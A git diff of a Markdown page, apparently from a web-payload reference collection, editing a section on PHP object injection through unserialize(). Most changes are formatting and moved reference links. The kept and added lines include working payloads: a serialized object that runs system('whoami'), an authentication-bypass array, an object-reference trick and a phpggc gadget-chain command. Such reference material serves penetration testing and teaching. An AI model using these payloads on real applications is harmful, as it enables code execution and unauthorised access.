@@ -1,10 +1,16 @@
-# PHP Object Injection
+# PHP Object injection
 
 PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.
 
+The following magic methods will help you for a PHP Object injection
+
+* __wakeup() when an object is unserialized.
+* __destruct() when an object is deleted.
+* __toString() when an object is converted to a string.
+
 Also you should check the `Wrapper Phar://` in [File Inclusion - Path Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#wrapper-phar) which use a PHP object injection.
 
-## Exploit with the __wakeup in the unserialize function
+## __wakeup in the unserialize function
 
 Vulnerable code:
 
@@ -40,7 +46,6 @@ a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}
 
 # Command execution
 string(68) "O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}"
-
 ```
 
 ## Authentication bypass
@@ -62,11 +67,11 @@ if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
 
 Payload:
 
-```
+```php
 a:2:{s:8:"username";b:1;s:8:"password";b:1;}
 ```
 
-Because `true == "str"` is true. Ref: [POC2009 Shocking News in PHP Exploitation](https://www.owasp.org/images/f/f6/POC2009-ShockingNewsInPHPExploitation.pdf)
+Because `true == "str"` is true.
 
 ### Object reference
 
@@ -93,14 +98,9 @@ if($obj) {
 
 Payload:
 
-```
+```php
 O:6:"Object":2:{s:10:"secretCode";N;s:4:"code";R:2;}
 ```
-
-Ref: 
-
-- [PHP Internals Book - Serialization](http://www.phpinternalsbook.com/classes_objects/serialization.html)
-- [TSULOTT Web challenge write-up from MeePwn CTF 1st 2017 by Rawsec](https://rawsec.ml/en/MeePwn-2017-write-ups/#tsulott-web)
 
 ## Others exploits
 
@@ -148,7 +148,10 @@ phpggc monolog/rce1 'phpinfo();' -s
 
 ## Thanks to
 
-- [PHP Object Injection - OWASP](https://www.owasp.org/index.php/PHP_Object_Injection)
-- [PHP Object Injection - Thin Ba Shane](http://location-href.com/php-object-injection/)
-- [PHP unserialize](http://php.net/manual/en/function.unserialize.php)
-- [PHP Generic Gadget - ambionics security](https://www.ambionics.io/blog/php-generic-gadget-chains)
+* [PHP Object Injection - OWASP](https://www.owasp.org/index.php/PHP_Object_Injection)
+* [PHP Object Injection - Thin Ba Shane](http://location-href.com/php-object-injection/)
+* [PHP unserialize](http://php.net/manual/en/function.unserialize.php)
+* [PHP Generic Gadget - ambionics security](https://www.ambionics.io/blog/php-generic-gadget-chains)
+* [POC2009 Shocking News in PHP Exploitation](https://www.owasp.org/images/f/f6/POC2009-ShockingNewsInPHPExploitation.pdf)
+* [PHP Internals Book - Serialization](http://www.phpinternalsbook.com/classes_objects/serialization.html)
+* [TSULOTT Web challenge write-up from MeePwn CTF 1st 2017 by Rawsec](https://rawsec.ml/en/MeePwn-2017-write-ups/#tsulott-web)
